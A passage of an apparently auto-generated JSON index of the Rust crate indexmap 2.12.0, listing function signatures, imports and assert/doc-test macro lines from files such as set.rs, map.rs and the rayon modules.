          "fn map_borsh_roundtrip() {",
          "fn set_borsh_roundtrip() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::vec::Vec;",
          "use core::hash::BuildHasher;",
          "use core::hash::Hash;",
          "use borsh::error::ERROR_ZST_FORBIDDEN;",
          "use borsh::io::{Error, ErrorKind, Read, Result, Write};",
          "use borsh::{BorshDeserialize, BorshSerialize};",
          "use crate::map::IndexMap;",
          "use crate::set::IndexSet;",
          "use super::*;"
        ],
        "macros": [
          "assert_eq!(original_map, deserialized_map);",
          "assert_eq!(original_map, deserialized_map);"
        ],
        "derives": [],
        "error_handling": 17
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/set.rs",
        "function_defs": [
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, other: &Self) {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn index(&self, index: usize) -> &T {",
          "fn from_iter<I: IntoIterator<Item = T>>(iterable: I) -> Self {",
          "fn from(arr: [T; N]) -> Self {",
          "fn extend<I: IntoIterator<Item = T>>(&mut self, iterable: I) {",
          "fn extend<I: IntoIterator<Item = &'a T>>(&mut self, iterable: I) {",
          "fn default() -> Self {",
          "fn eq(&self, other: &IndexSet<T, S2>) -> bool {",
          "fn bitand(self, other: &IndexSet<T, S2>) -> Self::Output {",
          "fn bitor(self, other: &IndexSet<T, S2>) -> Self::Output {",
          "fn bitxor(self, other: &IndexSet<T, S2>) -> Self::Output {",
          "fn sub(self, other: &IndexSet<T, S2>) -> Self::Output {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::TryReserveError;",
          "use std::hash::RandomState;",
          "use crate::util::try_simplify_range;",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::ops::{BitAnd, BitOr, BitXor, Index, RangeBounds, Sub};",
          "use super::{Equivalent, IndexMap};",
          "use `swap_remove` or `shift_remove` for explicit behavior.\")]",
          "use `swap_take` or `shift_take` for explicit behavior.\")]"
        ],
        "macros": [
          "/// assert!(letters.contains(&'s'));",
          "/// assert!(letters.contains(&'t'));",
          "/// assert!(letters.contains(&'u'));",
          "/// assert!(!letters.contains(&'y'));",
          "/// assert_eq!(evens, vec![0, 2, 4, 6]);",
          "/// assert_eq!(odds, vec![1, 3, 5, 7]);",
          "/// assert_eq!(set.get_index_of(&'*'), None);",
          "/// assert_eq!(set.insert_before(10, '*'), (10, true));",
          "/// assert_eq!(set.get_index_of(&'*'), Some(10));",
          "/// assert_eq!(set.insert_before(10, 'a'), (9, false));",
          "/// assert_eq!(set.get_index_of(&'a'), Some(9));",
          "/// assert_eq!(set.get_index_of(&'*'), Some(10));",
          "/// assert_eq!(set.insert_before(10, 'z'), (10, false));",
          "/// assert_eq!(set.get_index_of(&'z'), Some(10));",
          "/// assert_eq!(set.get_index_of(&'*'), Some(11));",
          "/// assert_eq!(set.len(), 27);",
          "/// assert_eq!(set.insert_before(set.len(), '*'), (26, false));",
          "/// assert_eq!(set.get_index_of(&'*'), Some(26));",
          "/// assert_eq!(set.insert_before(set.len(), '+'), (27, true));",
          "/// assert_eq!(set.get_index_of(&'+'), Some(27));",
          "/// assert_eq!(set.len(), 28);",
          "/// assert_eq!(set.get_index_of(&'*'), None);",
          "/// assert_eq!(set.shift_insert(10, '*'), true);",
          "/// assert_eq!(set.get_index_of(&'*'), Some(10));",
          "/// assert_eq!(set.shift_insert(10, 'a'), false);",
          "/// assert_eq!(set.get_index_of(&'a'), Some(10));",
          "/// assert_eq!(set.get_index_of(&'*'), Some(9));",
          "/// assert_eq!(set.shift_insert(9, 'z'), false);",
          "/// assert_eq!(set.get_index_of(&'z'), Some(9));",
          "/// assert_eq!(set.get_index_of(&'*'), Some(10));",
          "/// assert_eq!(set.len(), 27);",
          "/// assert_eq!(set.shift_insert(set.len() - 1, '*'), false);",
          "/// assert_eq!(set.get_index_of(&'*'), Some(26));",
          "/// assert_eq!(set.shift_insert(set.len(), '+'), true);",
          "/// assert_eq!(set.get_index_of(&'+'), Some(27));",
          "/// assert_eq!(set.len(), 28);",
          "/// assert!(set.into_iter().eq([0, 1, 5, 3, 2, 4]));",
          "/// assert_eq!(removed, &[2, 3]);",
          "/// assert_eq!(a.len(), 5);",
          "/// assert_eq!(b.len(), 0);",
          "/// assert_eq!(b.capacity(), old_capacity);",
          "/// assert!(a.iter().eq(&[3, 2, 1, 4, 5]));",
          "/// assert_eq!(set.pop_if(pred), Some(4));",
          "/// assert_eq!(set.as_slice(), &[1, 2, 3]);",
          "/// assert_eq!(set.pop_if(pred), None);",
          "/// assert_eq!(set[0], \"Lorem\");",
          "/// assert_eq!(set[1], \"ipsum\");",
          "/// assert_eq!(set[0], \"amet\");",
          "/// assert_eq!(set[1], \"sit\");",
          "/// assert_eq!(set[0], \"Lorem\");",
          "/// assert_eq!(set[1], \"amet\");",
          "/// println!(\"{:?}\", set[10]); // panics!",
          "panic!(",
          "/// assert_eq!(set1, set2);"
        ],
        "derives": [],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/macros.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn count(self) -> usize {",
          "fn nth(&mut self, n: usize) -> Option<Self::Item> {",
          "fn last(mut self) -> Option<Self::Item> {",
          "fn collect<C>(self) -> C",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn nth_back(&mut self, n: usize) -> Option<Self::Item> {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn opt_len(&self) -> Option<usize> {",
          "fn drive<C>(self, consumer: C) -> C::Result",
          "fn len(&self) -> usize {",
          "fn with_producer<CB>(self, callback: CB) -> CB::Output"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "/// assert_eq!(map[\"a\"], 1);",
          "/// assert_eq!(map[\"b\"], 2);",
          "/// assert_eq!(map.get(\"c\"), None);",
          "/// assert_eq!(map.keys().next(), Some(&\"a\"));",
          "($H:ty; $($key:expr => $value:expr,)+) => { $crate::indexmap_with_default!($H; $",
          "const CAP: usize = <[()]>::len(&[$({ stringify!($key); }),*]);",
          "/// assert_eq!(map[\"a\"], 1);",
          "/// assert_eq!(map[\"b\"], 2);",
          "/// assert_eq!(map.get(\"c\"), None);",
          "/// assert_eq!(map.keys().next(), Some(&\"a\"));",
          "($($key:expr => $value:expr,)+) => { $crate::indexmap!($($key => $value),+) };",
          "// Note: `stringify!($key)` is just here to consume the repetition,",
          "const CAP: usize = <[()]>::len(&[$({ stringify!($key); }),*]);",
          "/// assert!(set.contains(\"a\"));",
          "/// assert!(set.contains(\"b\"));",
          "/// assert!(!set.contains(\"c\"));",
          "/// assert_eq!(set.iter().next(), Some(&\"a\"));",
          "($H:ty; $($value:expr,)+) => { $crate::indexset_with_default!($H; $($value),+) }",
          "const CAP: usize = <[()]>::len(&[$({ stringify!($value); }),*]);",
          "/// assert!(set.contains(\"a\"));",
          "/// assert!(set.contains(\"b\"));",
          "/// assert!(!set.contains(\"c\"));",
          "/// assert_eq!(set.iter().next(), Some(&\"a\"));",
          "($($value:expr,)+) => { $crate::indexset!($($value),+) };",
          "// Note: `stringify!($value)` is just here to consume the repetition,",
          "const CAP: usize = <[()]>::len(&[$({ stringify!($value); }),*]);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map.rs",
        "function_defs": [
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, other: &Self) {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn index(&self, key: &Q) -> &V {",
          "fn index_mut(&mut self, key: &Q) -> &mut V {",
          "fn index(&self, index: usize) -> &V {",
          "fn index_mut(&mut self, index: usize) -> &mut V {",
          "fn from_iter<I: IntoIterator<Item = (K, V)>>(iterable: I) -> Self {",
          "fn from(arr: [(K, V); N]) -> Self {",
          "fn extend<I: IntoIterator<Item = (K, V)>>(&mut self, iterable: I) {",
          "fn extend<I: IntoIterator<Item = (&'a K, &'a V)>>(&mut self, iterable: I) {",
          "fn default() -> Self {",
          "fn eq(&self, other: &IndexMap<K, V2, S2>) -> bool {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use ::core::cmp::Ordering;",
          "use ::core::fmt;",
          "use ::core::hash::{BuildHasher, Hash};",
          "use ::core::mem;",
          "use ::core::ops::{Index, IndexMut, RangeBounds};",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use std::hash::RandomState;",
          "use crate::util::{third, try_simplify_range};",
          "use crate::{Bucket, Equivalent, GetDisjointMutError, HashValue, TryReserveError};",
          "use `swap_remove` or `shift_remove` for explicit behavior.\")]",
          "use `swap_remove_entry` or `shift_remove_entry` for explicit behavior.\")]"
        ],
        "macros": [
          "/// assert_eq!(letters[&'s'], 2);",
          "/// assert_eq!(letters[&'t'], 3);",
          "/// assert_eq!(letters[&'u'], 1);",
          "/// assert_eq!(letters.get(&'y'), None);",
          "/// assert_eq!(evens, vec![0, 2, 4, 6]);",
          "/// assert_eq!(odds, vec![1, 3, 5, 7]);",
          "/// assert_eq!(map.get_index_of(&'*'), None);",
          "/// assert_eq!(map.insert_before(10, '*', ()), (10, None));",
          "/// assert_eq!(map.get_index_of(&'*'), Some(10));",
          "/// assert_eq!(map.insert_before(10, 'a', ()), (9, Some(())));",
          "/// assert_eq!(map.get_index_of(&'a'), Some(9));",
          "/// assert_eq!(map.get_index_of(&'*'), Some(10));",
          "/// assert_eq!(map.insert_before(10, 'z', ()), (10, Some(())));",
          "/// assert_eq!(map.get_index_of(&'z'), Some(10));",
          "/// assert_eq!(map.get_index_of(&'*'), Some(11));",
          "/// assert_eq!(map.len(), 27);",
          "/// assert_eq!(map.insert_before(map.len(), '*', ()), (26, Some(())));",
          "/// assert_eq!(map.get_index_of(&'*'), Some(26));",
          "/// assert_eq!(map.insert_before(map.len(), '+', ()), (27, None));",
          "/// assert_eq!(map.get_index_of(&'+'), Some(27));",
          "/// assert_eq!(map.len(), 28);",
          "assert!(",
          "/// assert_eq!(map.get_index_of(&'*'), None);",
          "/// assert_eq!(map.shift_insert(10, '*', ()), None);",
          "/// assert_eq!(map.get_index_of(&'*'), Some(10));",
          "/// assert_eq!(map.shift_insert(10, 'a', ()), Some(()));",
          "/// assert_eq!(map.get_index_of(&'a'), Some(10));",
          "/// assert_eq!(map.get_index_of(&'*'), Some(9));",
          "/// assert_eq!(map.shift_insert(9, 'z', ()), Some(()));",
          "/// assert_eq!(map.get_index_of(&'z'), Some(9));",
          "/// assert_eq!(map.get_index_of(&'*'), Some(10));",
          "/// assert_eq!(map.len(), 27);",
          "/// assert_eq!(map.shift_insert(map.len() - 1, '*', ()), Some(()));",
          "/// assert_eq!(map.get_index_of(&'*'), Some(26));",
          "/// assert_eq!(map.shift_insert(map.len(), '+', ()), None);",
          "/// assert_eq!(map.get_index_of(&'+'), Some(27));",
          "/// assert_eq!(map.len(), 28);",
          "assert!(",
          "assert!(",
          "debug_assert_ne!(i, index);",
          "/// assert!(map.into_iter().eq([(0, '_'), (1, 'A'), (5, 'E'), (3, 'C'), (2, 'B')",
          "/// assert_eq!(removed, &[(2, 'b'), (3, 'c')]);",
          "/// assert_eq!(a.len(), 5);",
          "/// assert_eq!(b.len(), 0);",
          "/// assert_eq!(b.capacity(), old_capacity);",
          "/// assert!(a.keys().eq(&[3, 2, 1, 4, 5]));",
          "/// assert_eq!(a[&3], \"d\"); // \"c\" was overwritten.",
          "/// assert_eq!(map.get_disjoint_mut([&2, &1]), [Some(&mut 'c'), Some(&mut 'a')])",
          "unreachable!(",
          "panic!(\"duplicate keys found\");",
          "/// assert_eq!(map.pop_if(pred), Some((4, 'd')));",
          "/// assert_eq!(map.as_slice(), &init[..3]);",
          "/// assert_eq!(map.pop_if(pred), None);",
          "/// assert_eq!(map.get_disjoint_indices_mut([2, 0]), Ok([(&2, &mut 'c'), (&1, &m",
          "/// assert_eq!(map[\"lorem\"], \"LOREM\");",
          "/// assert_eq!(map[\"ipsum\"], \"IPSUM\");",
          "/// println!(\"{:?}\", map[\"bar\"]); // panics!",
          "/// assert_eq!(lorem, \"Lorem\");",
          "/// assert_eq!(map[\"lorem\"], \"orem\");",
          "/// assert_eq!(map[0], \"LOREM\");",
          "/// assert_eq!(map[1], \"IPSUM\");",
          "/// assert_eq!(map[0], \"AMET\");",
          "/// assert_eq!(map[1], \"SIT\");",
          "/// assert_eq!(map[0], \"AMET\");",
          "/// assert_eq!(map[1], \"DOLOR\");",
          "/// println!(\"{:?}\", map[10]); // panics!",
          "panic!(",
          "/// assert_eq!(lorem, \"Lorem\");",
          "/// assert_eq!(map[\"lorem\"], \"orem\");",
          "panic!(\"index out of bounds: the len is {len} but the index is {index}\");",
          "/// assert_eq!(map1, map2);"
        ],
        "derives": [],
        "error_handling": 37
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/rayon/mod.rs",
        "function_defs": [
          "fn collect<I: IntoParallelIterator>(iter: I) -> LinkedList<Vec<I::Item>> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use rayon::prelude::*;",
          "use alloc::collections::LinkedList;",
          "use alloc::vec::Vec;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/rayon/set.rs",
        "function_defs": [
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn par_drain<R: RangeBounds<usize>>(self, range: R) -> Self::Iter {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn from_par_iter<I>(iter: I) -> Self",
          "fn par_extend<I>(&mut self, iter: I)",
          "fn par_extend<I>(&mut self, iter: I)",
          "fn insert_order() {",
          "fn partial_eq_and_eq() {",
          "fn extend() {",
          "fn comparisons() {",
          "fn iter_comparisons() {",
          "fn check<'a, I1, I2>(iter1: I1, iter2: I2)"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::collect;",
          "use rayon::iter::plumbing::{Consumer, ProducerCallback, UnindexedConsumer};",
          "use rayon::prelude::*;",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::ops::RangeBounds;",
          "use crate::set::Slice;",
          "use crate::IndexSet;",
          "use super::*;",
          "use std::iter::empty;"
        ],
        "macros": [
          "parallel_iterator_methods!(Bucket::key);",
          "indexed_parallel_iterator_methods!(Bucket::key);",
          "parallel_iterator_methods!(Bucket::key_ref);",
          "indexed_parallel_iterator_methods!(Bucket::key_ref);",
          "parallel_iterator_methods!(Bucket::key);",
          "indexed_parallel_iterator_methods!(Bucket::key);",
          "assert_eq!(set.par_iter().count(), set.len());",
          "assert_eq!(set.par_iter().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set.get_index(i).unwrap(), v);",
          "assert!(set_a.par_eq(&set_b));",
          "assert!(!set_a.par_eq(&set_b));",
          "assert!(!set_a.par_eq(&set_b));",
          "assert!(!set_a.par_eq(&set_c));",
          "assert!(!set_c.par_eq(&set_a));",
          "assert_eq!(",
          "assert!(!set_a.par_is_disjoint(&set_a));",
          "assert!(set_a.par_is_subset(&set_a));",
          "assert!(set_a.par_is_superset(&set_a));",
          "assert!(set_a.par_is_disjoint(&set_b));",
          "assert!(set_b.par_is_disjoint(&set_a));",
          "assert!(!set_a.par_is_subset(&set_b));",
          "assert!(!set_b.par_is_subset(&set_a));",
          "assert!(!set_a.par_is_superset(&set_b));",
          "assert!(!set_b.par_is_superset(&set_a));",
          "assert!(!set_a.par_is_disjoint(&set_c));",
          "assert!(!set_c.par_is_disjoint(&set_a));",
          "assert!(set_a.par_is_subset(&set_c));",
          "assert!(!set_c.par_is_subset(&set_a));",
          "assert!(!set_a.par_is_superset(&set_c));",
          "assert!(set_c.par_is_superset(&set_a));",
          "assert!(!set_c.par_is_disjoint(&set_d));",
          "assert!(!set_d.par_is_disjoint(&set_c));",
          "assert!(!set_c.par_is_subset(&set_d));",
          "assert!(!set_d.par_is_subset(&set_c));",
          "assert!(!set_c.par_is_superset(&set_d));",
          "assert!(!set_d.par_is_superset(&set_c));",
          "assert_eq!(v1, v2);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/rayon/map.rs",
        "function_defs": [
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn par_drain<R: RangeBounds<usize>>(self, range: R) -> Self::Iter {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from_par_iter<I>(iter: I) -> Self",
          "fn par_extend<I>(&mut self, iter: I)",
          "fn par_extend<I>(&mut self, iter: I)",
          "fn insert_order() {",
          "fn partial_eq_and_eq() {",
          "fn extend() {",
          "fn keys() {",
          "fn values() {",
          "fn values_mut() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::collect;",
          "use rayon::iter::plumbing::{Consumer, ProducerCallback, UnindexedConsumer};",
          "use rayon::prelude::*;",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::ops::RangeBounds;",
          "use crate::map::Slice;",
          "use crate::Bucket;",
          "use crate::IndexMap;",
          "use super::*;",
          "use std::string::String;"
        ],
        "macros": [
          "parallel_iterator_methods!(Bucket::key_value);",
          "indexed_parallel_iterator_methods!(Bucket::key_value);",
          "parallel_iterator_methods!(Bucket::refs);",
          "indexed_parallel_iterator_methods!(Bucket::refs);",
          "parallel_iterator_methods!(Bucket::ref_mut);",
          "indexed_parallel_iterator_methods!(Bucket::ref_mut);",
          "parallel_iterator_methods!(Bucket::key_value);",
          "indexed_parallel_iterator_methods!(Bucket::key_value);",
          "parallel_iterator_methods!(Bucket::key_ref);",
          "indexed_parallel_iterator_methods!(Bucket::key_ref);",
          "parallel_iterator_methods!(Bucket::value_ref);",
          "indexed_parallel_iterator_methods!(Bucket::value_ref);",
          "parallel_iterator_methods!(Bucket::value_mut);",
          "indexed_parallel_iterator_methods!(Bucket::value_mut);",
          "assert_eq!(map.par_keys().count(), map.len());",
          "assert_eq!(map.par_keys().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(map.get_index(i).unwrap().0, k);",
          "assert!(map_a.par_eq(&map_b));",
          "assert!(!map_a.par_eq(&map_b));",
          "assert!(!map_a.par_eq(&map_b));",
          "assert!(!map_a.par_eq(&map_c));",
          "assert!(!map_c.par_eq(&map_a));",
          "assert_eq!(",
          "assert_eq!(keys.len(), 3);",
          "assert!(keys.contains(&1));",
          "assert!(keys.contains(&2));",
          "assert!(keys.contains(&3));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&'a'));",
          "assert!(values.contains(&'b'));",
          "assert!(values.contains(&'c'));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&2));",
          "assert!(values.contains(&4));",
          "assert!(values.contains(&6));"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/core.rs",
        "function_defs": [
          "fn get_hash<K, V>(entries: &[Bucket<K, V>]) -> impl Fn(&usize) -> u64 + use<'_, K, V> {",
          "fn equivalent<'a, K, V, Q: ?Sized + Equivalent<K>>(",
          "fn erase_index(table: &mut Indices, hash: HashValue, index: usize) {",
          "fn update_index(table: &mut Indices, hash: HashValue, old: usize, new: usize) {",
          "fn insert_bulk_no_grow<K, V>(indices: &mut Indices, entries: &[Bucket<K, V>]) {",
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, other: &Self) {",
          "fn borrow_mut(&mut self) -> RefMut<'_, K, V> {",
          "fn try_reserve_entries(&mut self, additional: usize) -> Result<(), TryReserveError> {",
          "fn push_entry(&mut self, hash: HashValue, key: K, value: V) {",
          "fn erase_indices(&mut self, start: usize, end: usize) {",
          "fn rebuild_hash_table(&mut self) {",
          "fn reserve_entries<K, V>(entries: &mut Entries<K, V>, additional: usize, try_capacity: usize) {",
          "fn new(indices: &'a mut Indices, entries: &'a mut Entries<K, V>) -> Self {",
          "fn reserve_entries(&mut self, additional: usize) {",
          "fn insert_unique(self, hash: HashValue, key: K, value: V) -> OccupiedEntry<'a, K, V> {",
          "fn replace_index_unique(",
          "fn shift_insert_unique(&mut self, index: usize, hash: HashValue, key: K, value: V) {",
          "fn shift_remove_index(&mut self, index: usize) -> Option<(K, V)> {",
          "fn shift_remove_finish(&mut self, index: usize) -> (K, V) {",
          "fn swap_remove_index(&mut self, index: usize) -> Option<(K, V)> {",
          "fn swap_remove_finish(&mut self, index: usize) -> (K, V) {",
          "fn decrement_indices(&mut self, start: usize, end: usize) {",
          "fn increment_indices(&mut self, start: usize, end: usize) {",
          "fn move_index(&mut self, from: usize, to: usize) {",
          "fn swap_indices(&mut self, a: usize, b: usize) {",
          "fn assert_send_sync() {",
          "fn assert_send_sync<T: Send + Sync>() {}"
        ],
        "struct_defs": [
          "struct RefMut<'a, K, V> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use alloc::vec::{self, Vec};",
          "use core::mem;",
          "use core::ops::RangeBounds;",
          "use hashbrown::hash_table;",
          "use crate::util::simplify_range;",
          "use crate::{Bucket, Equivalent, HashValue, TryReserveError};",
          "use rayon::iter::ParallelDrainRange;"
        ],
        "macros": [
          "} else if cfg!(debug_assertions) {",
          "panic!(\"index not found\");",
          "assert!(indices.capacity() - indices.len() >= entries.len());",
          "indices.insert_unique(entry.hash.get(), indices.len(), |_| unreachable!());",
          "debug_assert_eq!(self.entries.len(), self.indices.len());",
          "assert!(",
          "debug_assert_eq!(self.indices.len(), self.entries.len());",
          "debug_assert_eq!(self.indices.len(), self.entries.len());",
          "debug_assert_eq!(self.indices.len(), start + shifted);",
          "debug_assert_eq!(i, self.entries.len());",
          "assert!(index <= end);",
          "debug_assert_ne!(i, index);",
          "_ => panic!(\"indices not found\"),"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 17
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/slice.rs",
        "function_defs": [
          "fn into_boxed(self: Box<Self>) -> Box<[Bucket<K, V>]> {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn default() -> Self {",
          "fn default() -> Self {",
          "fn default() -> Self {",
          "fn clone(&self) -> Self {",
          "fn from(slice: &Slice<K, V>) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn eq(&self, other: &Slice<K2, V2>) -> bool {",
          "fn eq(&self, other: &[(K2, V2)]) -> bool {",
          "fn eq(&self, other: &Slice<K2, V2>) -> bool {",
          "fn eq(&self, other: &[(K2, V2); N]) -> bool {",
          "fn eq(&self, other: &Slice<K2, V2>) -> bool {",
          "fn partial_cmp(&self, other: &Self) -> Option<Ordering> {",
          "fn cmp(&self, other: &Self) -> Ordering {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn index(&self, index: usize) -> &V {",
          "fn index_mut(&mut self, index: usize) -> &mut V {",
          "fn index(&self, range: $range) -> &Self::Output {",
          "fn index_mut(&mut self, range: $range) -> &mut Self::Output {",
          "fn index(&self, range: $range) -> &Self {",
          "fn index_mut(&mut self, range: $range) -> &mut Self {",
          "fn slice_index() {",
          "fn check(",
          "fn slice_index_mut() {",
          "fn check_mut(",
          "fn slice_new() {",
          "fn slice_new_mut() {",
          "fn slice_get_index_mut() {",
          "fn slice_split_first() {",
          "fn slice_split_first_mut() {",
          "fn slice_split_last() {",
          "fn slice_split_last_mut() {",
          "fn slice_get_range() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::{",
          "use crate::util::{slice_eq, try_simplify_range};",
          "use crate::GetDisjointMutError;",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{Hash, Hasher};",
          "use core::ops::{self, Bound, Index, IndexMut, RangeBounds};",
          "use super::*;"
        ],
        "macros": [
          "impl_index!(",
          "assert_eq!(map_slice as *const _, sub_slice as *const _);",
          "assert_eq!(vec[i].1, map[i]);",
          "assert_eq!(vec[i].1, slice[i]);",
          "assert_eq!(map[&(i as i32)], map[i]);",
          "assert_eq!(map[&(i as i32)], slice[i]);",
          "assert_eq!(map_slice, sub_slice);",
          "assert_eq!(&mut map[i], &mut slice[i]);",
          "assert!(slice.is_empty());",
          "assert_eq!(slice.len(), 0);",
          "assert!(slice.is_empty());",
          "assert_eq!(slice.len(), 0);",
          "assert_eq!(*key, 0);",
          "assert_eq!(*value, 0);",
          "assert_eq!(slice[0], 11);",
          "assert!(result.is_none());",
          "assert!(result.is_none());",
          "assert_eq!(first, (&0, &0));",
          "assert_eq!(rest.len(), 9);",
          "assert_eq!(slice.len(), 10);",
          "assert!(result.is_none());",
          "assert_eq!(first, (&0, &mut 0));",
          "assert_eq!(rest.len(), 9);",
          "assert_eq!(slice.len(), 10);",
          "assert_eq!(slice[0], 11);",
          "assert!(result.is_none());",
          "assert_eq!(last, (&9, &81));",
          "assert_eq!(rest.len(), 9);",
          "assert_eq!(slice.len(), 10);",
          "assert!(result.is_none());",
          "assert_eq!(last, (&9, &mut 81));",
          "assert_eq!(rest.len(), 9);",
          "assert_eq!(slice.len(), 10);",
          "assert_eq!(slice[slice.len() - 1], 100);",
          "assert_eq!(subslice.len(), 3);",
          "assert_eq!(subslice, &[(3, 9), (4, 16), (5, 25)]);"
        ],
        "derives": [],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/map/iter.rs",
        "function_defs": [
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn len(&self) -> usize {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn index(&self, index: usize) -> &K {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
